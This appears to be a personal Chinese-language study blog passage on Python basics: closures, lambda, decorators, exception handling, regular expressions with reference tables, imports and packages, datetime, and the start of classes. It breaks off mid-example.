<h5 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h5><p>定义如下：闭包是一个可以由另一个函数动态生成的函数，并且可以改变和存储函数外创建的变量的值</p>
<p>简单的说：</p>
<ol>
<li>闭包首先得是一个内部函数</li>
<li>外部函数的返回值必须是内嵌函数</li>
<li>内嵌函数必须调用外部函数变量</li>
</ol>
<p>简单理解就行，需要时再查资料 <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1581754981&ver=2159&signature=hkhJ1*BNkRYWZkGeuPQdEgSiYmtkW03-T4zD8ymfsQt6tEki73x*uiU0xb9*pyVNMRi5M4IkL87NEZyLGgn0p*SzwOXrNLbaQCNXTVGetGFFEtClIqR9muptV8VZx4bk&new=1">参考</a></p>
<h5 id="匿名参数lanbda"><a href="#匿名参数lanbda" class="headerlink" title="匿名参数lanbda()"></a>匿名参数lanbda()</h5><p>还记得那个非洲的英语老师教学生读google的视频吗？这部分的内容就从“咕噜咕噜”开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">African_eng_teacher = [<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;gulugulu&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accent</span>(<span class="params">word</span>):</span></span><br><span class="line">    <span class="keyword">return</span> word.title() + <span class="string">&#x27;!&#x27;</span> <span class="comment">#.title()的作用是首字母大写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_google</span>(<span class="params">list_name, func</span>):</span> <span class="comment">#将函数作为参数调入，read_google(列表，函数)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list_name:</span><br><span class="line">        <span class="built_in">print</span>(func(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_google(African_eng_teacher, accent)</span><br><span class="line">read_google(African_eng_teacher, <span class="keyword">lambda</span> word : word.title()+<span class="string">&#x27;!&#x27;</span>) <span class="comment">#lambda在这用于取代accent函数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;outs:</span></span><br><span class="line"><span class="string">G!</span></span><br><span class="line"><span class="string">O!</span></span><br><span class="line"><span class="string">O!</span></span><br><span class="line"><span class="string">G!</span></span><br><span class="line"><span class="string">L!</span></span><br><span class="line"><span class="string">E!</span></span><br><span class="line"><span class="string">Gulugulu!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#两条语句的输出结果相同，均大声的念出了咕噜咕噜</span></span><br></pre></td></tr></table></figure>



<h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>装饰器的作用就是在不改变已有源代码的情况下，修改已经存在的函数</p>
<p>装饰器的一般格式：</p>
<ol>
<li>*args和**kwargs（个人理解是arguments和keyword arguments的意思，一个元组一个字典）</li>
<li>闭包</li>
<li>作为参数的函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqaure_it</span>(<span class="params">func</span>):</span>   <span class="comment">#此装饰器的功能是平方运算</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_function</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        result = func(*args,**kwargs)</span><br><span class="line">        <span class="keyword">return</span> result*result</span><br><span class="line">    <span class="keyword">return</span>  new_function</span><br><span class="line"></span><br><span class="line"><span class="meta">@sqaure_it            </span><span class="comment">#装饰器声明，要在使用的函数之前添加装饰器的名字（未选一般格式3）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_number</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (add_number(<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line"><span class="comment">#outs : 64</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">func</span>):</span>                       <span class="comment">#该装饰器实现了函数信息的打印</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_f</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;function name is:&#x27;</span>, func.__name__)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;add number is :&#x27;</span>, args)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;keyword arguments is&#x27;</span>, kwargs)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sum is :&#x27;</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@info</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_number</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_number(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">function name is: add_number</span></span><br><span class="line"><span class="string">add number is : (3, 4)</span></span><br><span class="line"><span class="string">keyword arguments is &#123;&#125;</span></span><br><span class="line"><span class="string">sum is : 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h3><ul>
<li>局部变量和全局变量的区别，在函数中如果想要调用全局变量需要先声明<code>global func_name</code>再给全局变量重新赋值</li>
<li>py提供了两个获取命名空间的函数<ul>
<li><code>locals()</code>返回一个局部变量的字典</li>
<li><code>globals()</code>返回一个全局变量的字典</li>
</ul>
</li>
</ul>
<h3 id="使用try-expec处理异常"><a href="#使用try-expec处理异常" class="headerlink" title="使用try-expec处理异常"></a>使用try-expec处理异常</h3><p>使用try-except代码块，依赖于try成功执行后的代码放在else代码块中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">short_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] </span><br><span class="line">position = <span class="number">5</span> </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    	short_list[position]</span><br><span class="line"><span class="keyword">except</span>: </span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Need a position between 0 and&#x27;</span>, <span class="built_in">len</span>(short_list)-<span class="number">1</span>, <span class="string">&#x27; but got&#x27;</span>, position)</span><br></pre></td></tr></table></figure>

<p>另一个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    do something</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError: <span class="comment">#文件不存在错误</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment">#什么都不干，不提示错误</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    do something</span><br></pre></td></tr></table></figure>

<p>异常处理大同小异，需要时再查阅资料</p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><a href="https://segmentfault.com/a/1190000022242427">https://segmentfault.com/a/1190000022242427</a></p>
<p>正则表达式的模式串patten可以分为两个部分</p>
<p><code>字符集　数量词</code></p>
<p><code>[]</code>表示一个or关系的字符集,<code>[abc]</code>就是表示一个a或者b或者c</p>
<p>数量词是跟在字符集后，表示前面的字符集出现的次数比如<code>&#123;4,7&#125;</code>表示前面的字符串出现４~7次</p>
<ul>
<li>py有一个自带表示一个字符串是另一个字符串字串的函数index()会返回查询子串在字符串中的位置，如果返回-1就是没找到</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =<span class="string">&quot;1234454666&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.index(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.index(<span class="string">&quot;66&quot;</span>)</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l <span class="keyword">in</span> a</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>但是正则表达式更加突出的是找到匹配模式的字符串</p>
<h4 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h4><p>匹配所有的符合规则串，返回一个list</p>
<h3 id="1-查找一个匹配项"><a href="#1-查找一个匹配项" class="headerlink" title="1.查找一个匹配项"></a>1.查找一个匹配项</h3><p>查找并返回一个匹配项的函数有3个：<strong>search、match、fullmatch</strong>，他们的区别分别是：</p>
<ol>
<li><strong>search：</strong> 查找任意位置的匹配项</li>
<li><strong>match：</strong> 必须从字符串开头匹配</li>
<li><strong>fullmatch：</strong> 整个字符串与正则完全匹配</li>
</ol>
<h4 id="search-匹配一个"><a href="#search-匹配一个" class="headerlink" title="search(匹配一个)"></a>search(匹配一个)</h4><p>从任意位置开始匹配，返回一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&quot;123&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search =re.search(<span class="string">&quot;\d&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search</span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">1</span>), match=<span class="string">&#x27;1&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>search.group()</span><br><span class="line"><span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回的是一个re模块的匹配对象</p>
<h4 id="match（匹配一个）"><a href="#match（匹配一个）" class="headerlink" title="match（匹配一个）"></a>match（匹配一个）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.match(<span class="string">&#x27;ll&#x27;</span>,<span class="string">&quot;l23333ll111&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>因为match必须从开头开始匹配，所以这个匹配不到内容</p>
<p>从字符串开头开始匹配字符串</p>
<h4 id="fullmatch"><a href="#fullmatch" class="headerlink" title="fullmatch"></a>fullmatch</h4><p>完全匹配，需要完全匹配</p>
<h4 id="贪婪匹配和非贪婪匹配"><a href="#贪婪匹配和非贪婪匹配" class="headerlink" title="贪婪匹配和非贪婪匹配"></a>贪婪匹配和非贪婪匹配</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;java*&amp;39android##@@python&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非贪婪</span></span><br><span class="line"></span><br><span class="line">re_findall1 = re.findall(<span class="string">&#x27;[a-z]&#123;4,7&#125;?&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(re_findall1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 贪婪</span></span><br><span class="line">re_findall2 = re.findall(<span class="string">&#x27;[a-z]&#123;4,7&#125;&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(re_findall2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;andr&#x27;</span>, <span class="string">&#x27;pyth&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;android&#x27;</span>, <span class="string">&#x27;python&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>加了问号就是非贪婪了</p>
<h3 id="2-查找多个匹配项"><a href="#2-查找多个匹配项" class="headerlink" title="2.查找多个匹配项"></a>2.查找多个匹配项</h3><p>讲完查找一项，现在来看看查找多项吧，查找多项函数主要有：<strong>findall函数</strong> 与 <strong>finditer函数</strong>：</p>
<ol>
<li><strong>findall：</strong> 从字符串任意位置查找，<strong>返回一个列表</strong></li>
<li><strong>finditer</strong>：从字符串任意位置查找，<strong>返回一个迭代器</strong></li>
</ol>
<p>两个方法基本类似，只不过一个是返回列表，一个是返回迭代器。我们知道列表是一次性生成在内存中，而迭代器是需要使用时一点一点生成出来的，内存使用更优。</p>
<h3 id="3-替换"><a href="#3-替换" class="headerlink" title="3.替换"></a>3.替换</h3><p>替换主要有<strong>sub函数</strong> 与 <strong>subn函数</strong>，他们功能类似！</p>
<p>先来看看<strong>sub函数</strong>的用法：</p>
<p><strong>re.sub(pattern, repl, string, count=0, flags=0)</strong> 函数参数讲解：repl替换掉string中被pattern匹配的字符， count表示最大替换次数，flags表示正则表达式的常量。</p>
<p>值得注意的是：<strong>sub函数</strong>中的入参：<strong>repl替换内容既可以是字符串，也可以是一个函数哦！</strong> 如果repl为函数时，只能有一个入参：Match匹配对象。</p>
<h3 id="4-切割"><a href="#4-切割" class="headerlink" title="4.切割"></a>4.切割</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">&quot;\.&quot;</span>,<span class="string">&quot;www.pornhub.com&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;pornhub&#x27;</span>, <span class="string">&#x27;com&#x27;</span>]</span><br><span class="line"><span class="comment"># 可以用于切割字符串并且返回一个列表</span></span><br></pre></td></tr></table></figure>





<h4 id="表达式全集"><a href="#表达式全集" class="headerlink" title="表达式全集"></a>表达式全集</h4><table>
<thead>
<tr>
<th align="center">字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\</td>
<td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>”匹配字符“<code>n</code>”。“<code>\n</code>”匹配一个换行符。串行“<code>\\</code>”匹配“<code>\</code>”而“<code>\(</code>”则匹配“<code>(</code>”。</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>”或“<code>\r</code>”之后的位置。</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>”或“<code>\r</code>”之前的位置。</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配前面的子表达式零次或多次。例如，zo<em>能匹配“<code>z</code>”以及“<code>zoo</code>”。</em>等价于{0,}。</td>
</tr>
<tr>
<td align="center">+</td>
<td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”。+等价于{1,}。</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>”可以匹配“<code>does</code>”或“<code>does</code>”中的“<code>do</code>”。?等价于{0,1}。</td>
</tr>
<tr>
<td align="center">{<em>n</em>}</td>
<td><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但是能匹配“<code>food</code>”中的两个o。</td>
</tr>
<tr>
<td align="center">{<em>n</em>,}</td>
<td><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但能匹配“<code>foooood</code>”中的所有o。“<code>o&#123;1,&#125;</code>”等价于“<code>o+</code>”。“<code>o&#123;0,&#125;</code>”则等价于“<code>o*</code>”。</td>
</tr>
<tr>
<td align="center">{<em>n</em>,<em>m</em>}</td>
<td><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>”将匹配“<code>fooooood</code>”中的前三个o。“<code>o&#123;0,1&#125;</code>”等价于“<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td>
</tr>
<tr>
<td align="center">?</td>
<td>当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>”，“<code>o+?</code>”将匹配单个“<code>o</code>”，而“<code>o+</code>”将匹配所有“<code>o</code>”。</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配除“<code>\</code>*<code>n</code><em>”之外的任何单个字符。要匹配包括“<code>\</code></em><code>n</code>*”在内的任何字符，请使用像“`(.</td>
</tr>
<tr>
<td align="center">(pattern)</td>
<td>匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>”或“<code>\)</code>”。</td>
</tr>
<tr>
<td align="center">(?:pattern)</td>
<td>匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td>
</tr>
<tr>
<td align="center">(?=pattern)</td>
<td>正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td>
</tr>
<tr>
<td align="center">(?!pattern)</td>
<td>正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td>
</tr>
<tr>
<td align="center">(?&lt;=pattern)</td>
<td>反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td>
</tr>
<tr>
<td align="center">(?&lt;!pattern)</td>
<td>反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td>
</tr>
<tr>
<td align="center">x|y</td>
<td>匹配x或y。例如，“`z</td>
</tr>
<tr>
<td align="center">[xyz]</td>
<td>字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>”可以匹配“<code>plain</code>”中的“<code>a</code>”。</td>
</tr>
<tr>
<td align="center">[^xyz]</td>
<td>负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>”可以匹配“<code>plain</code>”中的“<code>p</code>”。</td>
</tr>
<tr>
<td align="center">[a-z]</td>
<td>字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>”可以匹配“<code>a</code>”到“<code>z</code>”范围内的任意小写字母字符。</td>
</tr>
<tr>
<td align="center">[^a-z]</td>
<td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>”可以匹配任何不在“<code>a</code>”到“<code>z</code>”范围内的任意字符。</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>”可以匹配“<code>never</code>”中的“<code>er</code>”，但不能匹配“<code>verb</code>”中的“<code>er</code>”。</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配非单词边界。“<code>er\B</code>”能匹配“<code>verb</code>”中的“<code>er</code>”，但不能匹配“<code>never</code>”中的“<code>er</code>”。</td>
</tr>
<tr>
<td align="center">\cx</td>
<td>匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>”字符。</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配一个数字字符。等价于[0-9]。</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配一个非数字字符。等价于[^0-9]。</td>
</tr>
<tr>
<td align="center">\f</td>
<td>匹配一个换页符。等价于\x0c和\cL。</td>
</tr>
<tr>
<td align="center">\n</td>
<td>匹配一个换行符。等价于\x0a和\cJ。</td>
</tr>
<tr>
<td align="center">\r</td>
<td>匹配一个回车符。等价于\x0d和\cM。</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="center">\t</td>
<td>匹配一个制表符。等价于\x09和\cI。</td>
</tr>
<tr>
<td align="center">\v</td>
<td>匹配一个垂直制表符。等价于\x0b和\cK。</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>”。</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>”。</td>
</tr>
<tr>
<td align="center">\x<em>n</em></td>
<td>匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>”匹配“<code>A</code>”。“<code>\x041</code>”则等价于“<code>\x04&amp;1</code>”。正则表达式中可以使用ASCII编码。.</td>
</tr>
<tr>
<td align="center">*num*</td>
<td>匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>”匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="center">*n*</td>
<td>标识一个八进制转义值或一个向后引用。如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td>
</tr>
<tr>
<td align="center">*nm*</td>
<td>标识一个八进制转义值或一个向后引用。如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果*nm</em>之前至少有<em>n</em>个获取，则<em>n</em>为一个后跟文字<em>m</em>的向后引用。如果前面的条件都不满足，若<em>n</em>和<em>m</em>均为八进制数字（0-7），则*nm<em>将匹配八进制转义值</em>nm*。</td>
</tr>
<tr>
<td align="center">*nml*</td>
<td>如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td>
</tr>
<tr>
<td align="center">\u<em>n</em></td>
<td>匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。</td>
</tr>
</tbody></table>
<h4 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h4><table>
<thead>
<tr>
<th>用户名</th>
<th>/^[a-z0-9_-]{3,16}$/</th>
</tr>
</thead>
<tbody><tr>
<td>密码</td>
<td>/^[a-z0-9_-]{6,18}$/</td>
</tr>
<tr>
<td>十六进制值</td>
<td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td>
</tr>
<tr>
<td>电子邮箱</td>
<td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/   /^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td>
</tr>
<tr>
<td>URL</td>
<td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$/</td>
</tr>
<tr>
<td>IP 地址</td>
<td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</td>
</tr>
<tr>
<td>HTML 标签</td>
<td>/^&lt;([a-z]+)([^&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$/</td>
</tr>
<tr>
<td>删除代码\注释</td>
<td>(?&lt;!http:|\S)//.*$</td>
</tr>
<tr>
<td>Unicode编码中的汉字范围</td>
<td>/^[\u2E80-\u9FFF]+$/</td>
</tr>
</tbody></table>
<hr>
<h2 id="py模块、包"><a href="#py模块、包" class="headerlink" title="py模块、包"></a>py模块、包</h2><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><ul>
<li><p>导入整个模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moudle_name</span><br><span class="line"><span class="comment">#调用</span></span><br><span class="line">moudle_name.function_name()</span><br></pre></td></tr></table></figure></li>
<li><p>导入特定的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name</span><br><span class="line"><span class="comment">#可以用逗号分隔函数名</span></span><br><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_0,function_1</span><br></pre></td></tr></table></figure></li>
<li><p>用as给函数指定别名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name <span class="keyword">as</span> fn</span><br></pre></td></tr></table></figure></li>
<li><p>用as给模块指定别名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module_name <span class="keyword">as</span> mn</span><br></pre></td></tr></table></figure></li>
<li><p>导入模块中所有函数</p>
<p>使用<code>*</code>运算可以导入模块中的所有函数<code>from module_name import *</code></p>
</li>
<li><p>踩过坑的一点：例如我有一个文件正在编辑a.py，想从b的库里面导入名字为a的模块，那么在a.py的文件中不可以执行<code>from b import a</code>，原理也很简单，会引发歧义，报错的内容大概是<code>&quot;b&quot; ImportError: cannot import name a</code></p>
<p>（Python运行时，当前目录下不能有与引入的库文件相同的python文件，否则会在引入库文件时，找到相同的该文件）</p>
</li>
</ul>
<h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><p>假设当前编辑位于/desktop/test.py的程序，需要在/desktop下建立一个文件夹sources，/desktop/sources下包含你所有需要的模块，并且建立一个新的文件init.py,这样就完成了一个包的建立 ,    </p>
<p> usage:   <code>from sources import module_name1,module_name2...</code></p>
<h3 id="py标准库"><a href="#py标准库" class="headerlink" title="py标准库"></a>py标准库</h3><p><a href="http://docs.python.org/3/library">py3标准库</a></p>
<p>[标准库使用指南](<a href="https://docs.python.org/3.3/tutorial/stdlib">https://docs.python.org/3.3/tutorial/stdlib</a>. html)</p>
<p>datetime</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"> <span class="comment"># 将yyyy-mm-dd h:m:s格式的时间转换成py的datetime类型   </span></span><br><span class="line">date1 = dt.datetime.strptime(dep_date, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">date2 = dt.datetime.strptime(arr_date, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">(date1-date2).seconds</span><br><span class="line">(date1-date2).days</span><br><span class="line"></span><br><span class="line">date1.strftime(<span class="string">&quot;%d/%m/%Y&quot;</span>)</span><br><span class="line"><span class="comment">#重新转成字符串输出</span></span><br></pre></td></tr></table></figure>





<hr>
<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><ul>
<li>首先便是OOP(Object Oriented Programming)的概念了，没啥好说的。简单提一句，如果对象就是名词，那么方法就是动词。类代表着独立事物的高度抽象，而对象是对类的实例化具象实现形式。一笔带过，以往的概念直接套用即可    </li>
</ul>
<h4 id="从建立一个类开始"><a href="#从建立一个类开始" class="headerlink" title="从建立一个类开始"></a>从建立一个类开始</h4><p>约定俗成的一个规定，类名开头第一个字母大写，用于区分，增加可读性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>()</span></span><br><span class="line"><span class="class">	<span class="title">pass</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#实例化</span></span><br><span class="line"><span class="class"><span class="title">a_dog</span> = <span class="title">Dog</span>() </span></span><br></pre></td></tr></table></figure>



<ul>
<li>方法<code>__init__()</code></li>
</ul>
<p>此方法在每次调用类的实例时自动运行(直接“望文生义”吧，initialization)，name和age称之为dog类的属性，此方法类似c类语言的构造函数，self类似this指针(指向当前正在创建的对象本身)，self在py的<code>__init__()</code>中不可缺省</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>():</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sit</span> (<span class="params">self</span>):</span>     <span class="comment">#坐下！</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll_over</span>(<span class="params">self</span>):</span>    <span class="comment">#让狗狗打滚（爪巴？）</span></span><br><span 